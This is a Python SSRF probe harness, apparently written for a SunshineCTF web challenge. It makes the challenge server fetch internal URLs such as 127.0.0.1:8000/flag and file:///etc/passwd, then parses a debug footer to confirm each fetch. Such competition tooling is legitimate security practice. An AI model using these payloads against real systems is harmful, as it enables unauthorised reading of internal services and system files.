#!/usr/bin/env python3
"""Groundhog Day (SunshineCTF web 497) - SSRF probe harness.

The console takes feed=<url> on GET or POST to /, fetches it server side, and renders
the result.  The page footer carries the operator's own debug line

    <!-- feed-debug: source=<url> bytes=<n> -->

which is a clean oracle for "did the fetch succeed and how big was the answer", even
when the body is not rendered.  This helper prints that line plus everything else that
looks like data came back: the raw telemetry tape, the rendered stats, and any error.
"""
import html
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "https://odyssey.web.2026.sunshinectf.games"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"


def get(path="/", feed=None, method="GET", data=None, timeout=25):
    url = BASE + path
    if feed is not None:
        if method == "GET":
            url += ("&" if "?" in url else "?") + urllib.parse.urlencode({"feed": feed})
    req = urllib.request.Request(url, headers={"User-Agent": UA}, method=method)
    if method == "POST":
        body = urllib.parse.urlencode({"feed": feed or ""}).encode() if data is None else data
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    else:
        body = None
    try:
        with urllib.request.urlopen(req, body, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, "%r" % e


def digest(page):
    out = {}
    m = re.search(r"feed-debug:\s*source=(\S+)\s+bytes=(\S+?)\s*-->", page)
    out["debug"] = m.group(0) if m else None
    m = re.search(r'<pre class="tape">(.*?)</pre>', page, re.S)
    if m:
        raw = html.unescape(m.group(1)).strip()
        out["tape"] = raw
        try:
            json.loads(raw)
        except Exception as e:
            out["tape_unparsed"] = str(e)[:80]
    else:
        out["tape"] = None
    m = re.search(r'<p class="verdict">(.*?)</p>', page)
    out["verdict"] = m.group(1) if m else None
    out["iteration"] = (re.search(r"&numero;&thinsp;(\d+)", page) or [None, None])[1]
    m = re.search(r"(?i)(traceback|exception|error|denied|blocked|refused|forbidden|allowed|scheme)", page)
    if m:
        i = m.start()
        out["err_ctx"] = re.sub(r"\s+", " ", page[max(0, i - 90):i + 180])
    return out


def probe(label, feed, method="GET", path="/"):
    st, page = get(path, feed=feed, method=method)
    d = digest(page)
    print("--- %-34s http=%s" % (label, st))
    print("    debug : %s" % d["debug"])
    if d["tape"]:
        print("    tape  : %s" % d["tape"][:600].replace("\n", "\n            "))
    if d.get("tape_unparsed"):
        print("    tape is not JSON: %s" % d["tape_unparsed"])
    if d.get("err_ctx"):
        print("    err   : %s" % d["err_ctx"][:280])
    sys.stdout.flush()
    return d


if __name__ == "__main__":
    for label, feed in [
        ("default feed", "http://127.0.0.1:8000/feed"),
        ("root of station", "http://127.0.0.1:8000/"),
        ("station /flag", "http://127.0.0.1:8000/flag"),
        ("file:///etc/passwd", "file:///etc/passwd"),
        ("localhost alias", "http://localhost:8000/feed"),
    ]:
        probe(label, feed)
        time.sleep(1.2)
